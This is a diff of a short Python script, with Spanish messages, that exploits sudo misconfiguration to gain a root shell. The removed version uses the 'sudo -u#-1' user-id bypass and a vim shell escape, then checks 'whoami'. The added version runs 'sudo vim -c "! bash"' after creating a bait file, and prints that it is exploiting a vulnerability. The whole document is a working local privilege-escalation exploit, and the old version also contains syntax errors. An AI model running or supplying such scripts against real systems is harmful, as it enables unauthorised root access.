@@ -1,9 +1,12 @@
-Def PruebaSUDO():
-  Com1 = “sudo -u#-1 vim file1.txt”
-  ComVim1 = “vim -c bash! file1.txt”
-  Com2 = “whoami”
-  os.system(Com1)
-  os.system(ComVim1)
-  os.system(Com2)
-  print(“Prueba exitosa”)
- PruebaSUDO()
+def PruebaSUDO():
+  import os
+  import os.path
+
+  if os.path.isfile('/home/user2files/file1.txt'):
+        print("El archivo ansuelo existe ... Explotando vulnerabilidad")
+        os.system('sudo vim -c "! bash" file1.txt')
+  else:
+        os.system('touch /home/user2files/file1.txt')
+        print("Archivo creado ... Ejecutar el programa otra vez")
+
+PruebaSUDO()
